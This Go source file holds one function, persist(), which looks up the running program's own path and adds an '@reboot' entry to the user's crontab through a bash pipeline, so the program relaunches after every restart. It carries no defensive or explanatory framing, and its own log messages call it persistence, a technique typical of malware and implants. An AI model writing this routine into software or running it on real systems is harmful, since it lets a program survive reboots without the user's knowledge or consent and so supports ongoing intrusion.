package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
)

func persist() {
	execPath, err := os.Executable()
	if err != nil {
		log.Printf("failed to get executable path: %v", err)
		return
	}
	out, err := exec.Command("crontab", "-l").Output()
	if err != nil {
		log.Printf("failed to read crontab: %v", err)
	}
	if strings.Contains(string(out), execPath) {
		log.Println("Persistence already set up in crontab.")
		return
	}
	cronEntry := fmt.Sprintf("@reboot %s\n", execPath)
	cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo \"%s\") | crontab -", cronEntry))
	if err := cmd.Run(); err != nil {
		log.Printf("failed to set up persistence in crontab: %v", err)
		return
	}
}
